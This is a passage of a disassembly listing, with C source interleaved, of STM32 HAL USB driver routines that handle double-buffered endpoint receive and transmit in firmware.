 8002c52:	4619      	mov	r1, r3
 8002c54:	6878      	ldr	r0, [r7, #4]
 8002c56:	f009 fe46 	bl	800c8e6 <HAL_PCD_DataInStageCallback>
 8002c5a:	e01b      	b.n	8002c94 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002c5c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c5e:	695a      	ldr	r2, [r3, #20]
 8002c60:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c64:	441a      	add	r2, r3
 8002c66:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c68:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002c6a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c6c:	69da      	ldr	r2, [r3, #28]
 8002c6e:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c72:	441a      	add	r2, r3
 8002c74:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c76:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002c78:	687b      	ldr	r3, [r7, #4]
 8002c7a:	681b      	ldr	r3, [r3, #0]
 8002c7c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c7e:	4618      	mov	r0, r3
 8002c80:	f003 fec3 	bl	8006a0a <USB_EPStartXfer>
 8002c84:	e006      	b.n	8002c94 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002c86:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c8a:	461a      	mov	r2, r3
 8002c8c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c8e:	6878      	ldr	r0, [r7, #4]
 8002c90:	f000 f917 	bl	8002ec2 <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002c94:	687b      	ldr	r3, [r7, #4]
 8002c96:	681b      	ldr	r3, [r3, #0]
 8002c98:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002c9c:	b29b      	uxth	r3, r3
 8002c9e:	b21b      	sxth	r3, r3
 8002ca0:	2b00      	cmp	r3, #0
 8002ca2:	f6ff ac45 	blt.w	8002530 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002ca6:	2300      	movs	r3, #0
}
 8002ca8:	4618      	mov	r0, r3
 8002caa:	3758      	adds	r7, #88	; 0x58
 8002cac:	46bd      	mov	sp, r7
 8002cae:	bd80      	pop	{r7, pc}

08002cb0 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002cb0:	b580      	push	{r7, lr}
 8002cb2:	b088      	sub	sp, #32
 8002cb4:	af00      	add	r7, sp, #0
 8002cb6:	60f8      	str	r0, [r7, #12]
 8002cb8:	60b9      	str	r1, [r7, #8]
 8002cba:	4613      	mov	r3, r2
 8002cbc:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002cbe:	88fb      	ldrh	r3, [r7, #6]
 8002cc0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002cc4:	2b00      	cmp	r3, #0
 8002cc6:	d07c      	beq.n	8002dc2 <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002cc8:	68fb      	ldr	r3, [r7, #12]
 8002cca:	681b      	ldr	r3, [r3, #0]
 8002ccc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002cd0:	b29b      	uxth	r3, r3
 8002cd2:	461a      	mov	r2, r3
 8002cd4:	68bb      	ldr	r3, [r7, #8]
 8002cd6:	781b      	ldrb	r3, [r3, #0]
 8002cd8:	00db      	lsls	r3, r3, #3
 8002cda:	4413      	add	r3, r2
 8002cdc:	68fa      	ldr	r2, [r7, #12]
 8002cde:	6812      	ldr	r2, [r2, #0]
 8002ce0:	4413      	add	r3, r2
 8002ce2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002ce6:	881b      	ldrh	r3, [r3, #0]
 8002ce8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002cec:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002cee:	68bb      	ldr	r3, [r7, #8]
 8002cf0:	699a      	ldr	r2, [r3, #24]
 8002cf2:	8b7b      	ldrh	r3, [r7, #26]
 8002cf4:	429a      	cmp	r2, r3
 8002cf6:	d306      	bcc.n	8002d06 <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002cf8:	68bb      	ldr	r3, [r7, #8]
 8002cfa:	699a      	ldr	r2, [r3, #24]
 8002cfc:	8b7b      	ldrh	r3, [r7, #26]
 8002cfe:	1ad2      	subs	r2, r2, r3
 8002d00:	68bb      	ldr	r3, [r7, #8]
 8002d02:	619a      	str	r2, [r3, #24]
 8002d04:	e002      	b.n	8002d0c <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002d06:	68bb      	ldr	r3, [r7, #8]
 8002d08:	2200      	movs	r2, #0
 8002d0a:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002d0c:	68bb      	ldr	r3, [r7, #8]
 8002d0e:	699b      	ldr	r3, [r3, #24]
 8002d10:	2b00      	cmp	r3, #0
 8002d12:	d123      	bne.n	8002d5c <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002d14:	68fb      	ldr	r3, [r7, #12]
 8002d16:	681b      	ldr	r3, [r3, #0]
 8002d18:	461a      	mov	r2, r3
 8002d1a:	68bb      	ldr	r3, [r7, #8]
 8002d1c:	781b      	ldrb	r3, [r3, #0]
 8002d1e:	009b      	lsls	r3, r3, #2
 8002d20:	4413      	add	r3, r2
 8002d22:	881b      	ldrh	r3, [r3, #0]
 8002d24:	b29b      	uxth	r3, r3
 8002d26:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002d2a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d2e:	833b      	strh	r3, [r7, #24]
 8002d30:	8b3b      	ldrh	r3, [r7, #24]
 8002d32:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002d36:	833b      	strh	r3, [r7, #24]
 8002d38:	68fb      	ldr	r3, [r7, #12]
 8002d3a:	681b      	ldr	r3, [r3, #0]
 8002d3c:	461a      	mov	r2, r3
 8002d3e:	68bb      	ldr	r3, [r7, #8]
 8002d40:	781b      	ldrb	r3, [r3, #0]
 8002d42:	009b      	lsls	r3, r3, #2
 8002d44:	441a      	add	r2, r3
 8002d46:	8b3b      	ldrh	r3, [r7, #24]
 8002d48:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002d4c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002d50:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002d54:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002d58:	b29b      	uxth	r3, r3
 8002d5a:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002d5c:	88fb      	ldrh	r3, [r7, #6]
 8002d5e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002d62:	2b00      	cmp	r3, #0
 8002d64:	d01f      	beq.n	8002da6 <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002d66:	68fb      	ldr	r3, [r7, #12]
 8002d68:	681b      	ldr	r3, [r3, #0]
 8002d6a:	461a      	mov	r2, r3
 8002d6c:	68bb      	ldr	r3, [r7, #8]
 8002d6e:	781b      	ldrb	r3, [r3, #0]
 8002d70:	009b      	lsls	r3, r3, #2
 8002d72:	4413      	add	r3, r2
 8002d74:	881b      	ldrh	r3, [r3, #0]
 8002d76:	b29b      	uxth	r3, r3
 8002d78:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002d7c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d80:	82fb      	strh	r3, [r7, #22]
 8002d82:	68fb      	ldr	r3, [r7, #12]
 8002d84:	681b      	ldr	r3, [r3, #0]
 8002d86:	461a      	mov	r2, r3
 8002d88:	68bb      	ldr	r3, [r7, #8]
 8002d8a:	781b      	ldrb	r3, [r3, #0]
 8002d8c:	009b      	lsls	r3, r3, #2
 8002d8e:	441a      	add	r2, r3
 8002d90:	8afb      	ldrh	r3, [r7, #22]
 8002d92:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002d96:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002d9a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002d9e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002da2:	b29b      	uxth	r3, r3
 8002da4:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002da6:	8b7b      	ldrh	r3, [r7, #26]
 8002da8:	2b00      	cmp	r3, #0
 8002daa:	f000 8085 	beq.w	8002eb8 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002dae:	68fb      	ldr	r3, [r7, #12]
 8002db0:	6818      	ldr	r0, [r3, #0]
 8002db2:	68bb      	ldr	r3, [r7, #8]
 8002db4:	6959      	ldr	r1, [r3, #20]
 8002db6:	68bb      	ldr	r3, [r7, #8]
 8002db8:	891a      	ldrh	r2, [r3, #8]
 8002dba:	8b7b      	ldrh	r3, [r7, #26]
 8002dbc:	f005 fb73 	bl	80084a6 <USB_ReadPMA>
 8002dc0:	e07a      	b.n	8002eb8 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002dc2:	68fb      	ldr	r3, [r7, #12]
 8002dc4:	681b      	ldr	r3, [r3, #0]
 8002dc6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002dca:	b29b      	uxth	r3, r3
 8002dcc:	461a      	mov	r2, r3
 8002dce:	68bb      	ldr	r3, [r7, #8]
 8002dd0:	781b      	ldrb	r3, [r3, #0]
 8002dd2:	00db      	lsls	r3, r3, #3
 8002dd4:	4413      	add	r3, r2
 8002dd6:	68fa      	ldr	r2, [r7, #12]
 8002dd8:	6812      	ldr	r2, [r2, #0]
 8002dda:	4413      	add	r3, r2
 8002ddc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002de0:	881b      	ldrh	r3, [r3, #0]
 8002de2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002de6:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002de8:	68bb      	ldr	r3, [r7, #8]
 8002dea:	699a      	ldr	r2, [r3, #24]
 8002dec:	8b7b      	ldrh	r3, [r7, #26]
 8002dee:	429a      	cmp	r2, r3
 8002df0:	d306      	bcc.n	8002e00 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002df2:	68bb      	ldr	r3, [r7, #8]
 8002df4:	699a      	ldr	r2, [r3, #24]
 8002df6:	8b7b      	ldrh	r3, [r7, #26]
 8002df8:	1ad2      	subs	r2, r2, r3
 8002dfa:	68bb      	ldr	r3, [r7, #8]
 8002dfc:	619a      	str	r2, [r3, #24]
 8002dfe:	e002      	b.n	8002e06 <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002e00:	68bb      	ldr	r3, [r7, #8]
 8002e02:	2200      	movs	r2, #0
 8002e04:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002e06:	68bb      	ldr	r3, [r7, #8]
 8002e08:	699b      	ldr	r3, [r3, #24]
 8002e0a:	2b00      	cmp	r3, #0
 8002e0c:	d123      	bne.n	8002e56 <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002e0e:	68fb      	ldr	r3, [r7, #12]
 8002e10:	681b      	ldr	r3, [r3, #0]
 8002e12:	461a      	mov	r2, r3
 8002e14:	68bb      	ldr	r3, [r7, #8]
 8002e16:	781b      	ldrb	r3, [r3, #0]
 8002e18:	009b      	lsls	r3, r3, #2
 8002e1a:	4413      	add	r3, r2
 8002e1c:	881b      	ldrh	r3, [r3, #0]
 8002e1e:	b29b      	uxth	r3, r3
 8002e20:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002e24:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e28:	83fb      	strh	r3, [r7, #30]
 8002e2a:	8bfb      	ldrh	r3, [r7, #30]
 8002e2c:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002e30:	83fb      	strh	r3, [r7, #30]
 8002e32:	68fb      	ldr	r3, [r7, #12]
 8002e34:	681b      	ldr	r3, [r3, #0]
 8002e36:	461a      	mov	r2, r3
 8002e38:	68bb      	ldr	r3, [r7, #8]
 8002e3a:	781b      	ldrb	r3, [r3, #0]
 8002e3c:	009b      	lsls	r3, r3, #2
 8002e3e:	441a      	add	r2, r3
 8002e40:	8bfb      	ldrh	r3, [r7, #30]
 8002e42:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e46:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e4a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e4e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002e52:	b29b      	uxth	r3, r3
 8002e54:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8002e56:	88fb      	ldrh	r3, [r7, #6]
 8002e58:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002e5c:	2b00      	cmp	r3, #0
 8002e5e:	d11f      	bne.n	8002ea0 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002e60:	68fb      	ldr	r3, [r7, #12]
 8002e62:	681b      	ldr	r3, [r3, #0]
 8002e64:	461a      	mov	r2, r3
 8002e66:	68bb      	ldr	r3, [r7, #8]
 8002e68:	781b      	ldrb	r3, [r3, #0]
 8002e6a:	009b      	lsls	r3, r3, #2
 8002e6c:	4413      	add	r3, r2
 8002e6e:	881b      	ldrh	r3, [r3, #0]
 8002e70:	b29b      	uxth	r3, r3
 8002e72:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002e76:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e7a:	83bb      	strh	r3, [r7, #28]
 8002e7c:	68fb      	ldr	r3, [r7, #12]
 8002e7e:	681b      	ldr	r3, [r3, #0]
 8002e80:	461a      	mov	r2, r3
 8002e82:	68bb      	ldr	r3, [r7, #8]
 8002e84:	781b      	ldrb	r3, [r3, #0]
 8002e86:	009b      	lsls	r3, r3, #2
 8002e88:	441a      	add	r2, r3
 8002e8a:	8bbb      	ldrh	r3, [r7, #28]
 8002e8c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e90:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e94:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e98:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002e9c:	b29b      	uxth	r3, r3
 8002e9e:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002ea0:	8b7b      	ldrh	r3, [r7, #26]
 8002ea2:	2b00      	cmp	r3, #0
 8002ea4:	d008      	beq.n	8002eb8 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002ea6:	68fb      	ldr	r3, [r7, #12]
 8002ea8:	6818      	ldr	r0, [r3, #0]
 8002eaa:	68bb      	ldr	r3, [r7, #8]
 8002eac:	6959      	ldr	r1, [r3, #20]
 8002eae:	68bb      	ldr	r3, [r7, #8]
 8002eb0:	895a      	ldrh	r2, [r3, #10]
 8002eb2:	8b7b      	ldrh	r3, [r7, #26]
 8002eb4:	f005 faf7 	bl	80084a6 <USB_ReadPMA>
    }
  }

  return count;
 8002eb8:	8b7b      	ldrh	r3, [r7, #26]
}
 8002eba:	4618      	mov	r0, r3
 8002ebc:	3720      	adds	r7, #32
 8002ebe:	46bd      	mov	sp, r7
 8002ec0:	bd80      	pop	{r7, pc}

08002ec2 <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002ec2:	b580      	push	{r7, lr}
 8002ec4:	b0a4      	sub	sp, #144	; 0x90
 8002ec6:	af00      	add	r7, sp, #0
 8002ec8:	60f8      	str	r0, [r7, #12]
 8002eca:	60b9      	str	r1, [r7, #8]
 8002ecc:	4613      	mov	r3, r2
 8002ece:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ed0:	88fb      	ldrh	r3, [r7, #6]
 8002ed2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ed6:	2b00      	cmp	r3, #0
 8002ed8:	f000 81db 	beq.w	8003292 <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002edc:	68fb      	ldr	r3, [r7, #12]
 8002ede:	681b      	ldr	r3, [r3, #0]
 8002ee0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ee4:	b29b      	uxth	r3, r3
 8002ee6:	461a      	mov	r2, r3
 8002ee8:	68bb      	ldr	r3, [r7, #8]
 8002eea:	781b      	ldrb	r3, [r3, #0]
 8002eec:	00db      	lsls	r3, r3, #3
 8002eee:	4413      	add	r3, r2
 8002ef0:	68fa      	ldr	r2, [r7, #12]
 8002ef2:	6812      	ldr	r2, [r2, #0]
 8002ef4:	4413      	add	r3, r2
 8002ef6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002efa:	881b      	ldrh	r3, [r3, #0]
 8002efc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f00:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 8002f04:	68bb      	ldr	r3, [r7, #8]
 8002f06:	699a      	ldr	r2, [r3, #24]
 8002f08:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f0c:	429a      	cmp	r2, r3
 8002f0e:	d907      	bls.n	8002f20 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8002f10:	68bb      	ldr	r3, [r7, #8]
 8002f12:	699a      	ldr	r2, [r3, #24]
 8002f14:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f18:	1ad2      	subs	r2, r2, r3
 8002f1a:	68bb      	ldr	r3, [r7, #8]
 8002f1c:	619a      	str	r2, [r3, #24]
 8002f1e:	e002      	b.n	8002f26 <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8002f20:	68bb      	ldr	r3, [r7, #8]
 8002f22:	2200      	movs	r2, #0
 8002f24:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8002f26:	68bb      	ldr	r3, [r7, #8]
 8002f28:	699b      	ldr	r3, [r3, #24]
 8002f2a:	2b00      	cmp	r3, #0
 8002f2c:	f040 80b9 	bne.w	80030a2 <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002f30:	68bb      	ldr	r3, [r7, #8]
 8002f32:	785b      	ldrb	r3, [r3, #1]
 8002f34:	2b00      	cmp	r3, #0
 8002f36:	d126      	bne.n	8002f86 <HAL_PCD_EP_DB_Transmit+0xc4>
 8002f38:	68fb      	ldr	r3, [r7, #12]
 8002f3a:	681b      	ldr	r3, [r3, #0]
 8002f3c:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f3e:	68fb      	ldr	r3, [r7, #12]
 8002f40:	681b      	ldr	r3, [r3, #0]
 8002f42:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f46:	b29b      	uxth	r3, r3
 8002f48:	461a      	mov	r2, r3
 8002f4a:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f4c:	4413      	add	r3, r2
 8002f4e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f50:	68bb      	ldr	r3, [r7, #8]
 8002f52:	781b      	ldrb	r3, [r3, #0]
 8002f54:	00da      	lsls	r2, r3, #3
 8002f56:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f58:	4413      	add	r3, r2
 8002f5a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f5e:	62bb      	str	r3, [r7, #40]	; 0x28
 8002f60:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f62:	881b      	ldrh	r3, [r3, #0]
 8002f64:	b29b      	uxth	r3, r3
 8002f66:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f6a:	b29a      	uxth	r2, r3
 8002f6c:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f6e:	801a      	strh	r2, [r3, #0]
 8002f70:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f72:	881b      	ldrh	r3, [r3, #0]
 8002f74:	b29b      	uxth	r3, r3
 8002f76:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002f7a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002f7e:	b29a      	uxth	r2, r3
 8002f80:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f82:	801a      	strh	r2, [r3, #0]
 8002f84:	e01a      	b.n	8002fbc <HAL_PCD_EP_DB_Transmit+0xfa>
 8002f86:	68bb      	ldr	r3, [r7, #8]
 8002f88:	785b      	ldrb	r3, [r3, #1]
 8002f8a:	2b01      	cmp	r3, #1
 8002f8c:	d116      	bne.n	8002fbc <HAL_PCD_EP_DB_Transmit+0xfa>
 8002f8e:	68fb      	ldr	r3, [r7, #12]
 8002f90:	681b      	ldr	r3, [r3, #0]
 8002f92:	637b      	str	r3, [r7, #52]	; 0x34
 8002f94:	68fb      	ldr	r3, [r7, #12]
 8002f96:	681b      	ldr	r3, [r3, #0]
 8002f98:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f9c:	b29b      	uxth	r3, r3
 8002f9e:	461a      	mov	r2, r3
 8002fa0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002fa2:	4413      	add	r3, r2
 8002fa4:	637b      	str	r3, [r7, #52]	; 0x34
 8002fa6:	68bb      	ldr	r3, [r7, #8]
 8002fa8:	781b      	ldrb	r3, [r3, #0]
 8002faa:	00da      	lsls	r2, r3, #3
 8002fac:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002fae:	4413      	add	r3, r2
 8002fb0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002fb4:	633b      	str	r3, [r7, #48]	; 0x30
 8002fb6:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002fb8:	2200      	movs	r2, #0
 8002fba:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002fbc:	68fb      	ldr	r3, [r7, #12]
 8002fbe:	681b      	ldr	r3, [r3, #0]
 8002fc0:	627b      	str	r3, [r7, #36]	; 0x24
 8002fc2:	68bb      	ldr	r3, [r7, #8]
 8002fc4:	785b      	ldrb	r3, [r3, #1]
 8002fc6:	2b00      	cmp	r3, #0
 8002fc8:	d126      	bne.n	8003018 <HAL_PCD_EP_DB_Transmit+0x156>
 8002fca:	68fb      	ldr	r3, [r7, #12]
 8002fcc:	681b      	ldr	r3, [r3, #0]
 8002fce:	61fb      	str	r3, [r7, #28]
 8002fd0:	68fb      	ldr	r3, [r7, #12]
 8002fd2:	681b      	ldr	r3, [r3, #0]
 8002fd4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fd8:	b29b      	uxth	r3, r3
 8002fda:	461a      	mov	r2, r3
 8002fdc:	69fb      	ldr	r3, [r7, #28]
 8002fde:	4413      	add	r3, r2
 8002fe0:	61fb      	str	r3, [r7, #28]
 8002fe2:	68bb      	ldr	r3, [r7, #8]
 8002fe4:	781b      	ldrb	r3, [r3, #0]
 8002fe6:	00da      	lsls	r2, r3, #3
 8002fe8:	69fb      	ldr	r3, [r7, #28]
 8002fea:	4413      	add	r3, r2
 8002fec:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002ff0:	61bb      	str	r3, [r7, #24]
 8002ff2:	69bb      	ldr	r3, [r7, #24]
 8002ff4:	881b      	ldrh	r3, [r3, #0]
 8002ff6:	b29b      	uxth	r3, r3
 8002ff8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ffc:	b29a      	uxth	r2, r3
 8002ffe:	69bb      	ldr	r3, [r7, #24]
 8003000:	801a      	strh	r2, [r3, #0]
 8003002:	69bb      	ldr	r3, [r7, #24]
 8003004:	881b      	ldrh	r3, [r3, #0]
 8003006:	b29b      	uxth	r3, r3
 8003008:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800300c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003010:	b29a      	uxth	r2, r3
 8003012:	69bb      	ldr	r3, [r7, #24]
 8003014:	801a      	strh	r2, [r3, #0]
 8003016:	e017      	b.n	8003048 <HAL_PCD_EP_DB_Transmit+0x186>
 8003018:	68bb      	ldr	r3, [r7, #8]
 800301a:	785b      	ldrb	r3, [r3, #1]
 800301c:	2b01      	cmp	r3, #1
 800301e:	d113      	bne.n	8003048 <HAL_PCD_EP_DB_Transmit+0x186>
 8003020:	68fb      	ldr	r3, [r7, #12]
 8003022:	681b      	ldr	r3, [r3, #0]
 8003024:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003028:	b29b      	uxth	r3, r3
 800302a:	461a      	mov	r2, r3
 800302c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800302e:	4413      	add	r3, r2
 8003030:	627b      	str	r3, [r7, #36]	; 0x24
 8003032:	68bb      	ldr	r3, [r7, #8]
 8003034:	781b      	ldrb	r3, [r3, #0]
 8003036:	00da      	lsls	r2, r3, #3
 8003038:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800303a:	4413      	add	r3, r2
 800303c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003040:	623b      	str	r3, [r7, #32]
 8003042:	6a3b      	ldr	r3, [r7, #32]
 8003044:	2200      	movs	r2, #0
 8003046:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003048:	68bb      	ldr	r3, [r7, #8]
 800304a:	781b      	ldrb	r3, [r3, #0]
 800304c:	4619      	mov	r1, r3
 800304e:	68f8      	ldr	r0, [r7, #12]
 8003050:	f009 fc49 	bl	800c8e6 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003054:	88fb      	ldrh	r3, [r7, #6]
 8003056:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800305a:	2b00      	cmp	r3, #0
 800305c:	f000 82fa 	beq.w	8003654 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003060:	68fb      	ldr	r3, [r7, #12]
 8003062:	681b      	ldr	r3, [r3, #0]
 8003064:	461a      	mov	r2, r3
 8003066:	68bb      	ldr	r3, [r7, #8]
 8003068:	781b      	ldrb	r3, [r3, #0]
 800306a:	009b      	lsls	r3, r3, #2
 800306c:	4413      	add	r3, r2
 800306e:	881b      	ldrh	r3, [r3, #0]
 8003070:	b29b      	uxth	r3, r3
 8003072:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003076:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800307a:	82fb      	strh	r3, [r7, #22]
 800307c:	68fb      	ldr	r3, [r7, #12]
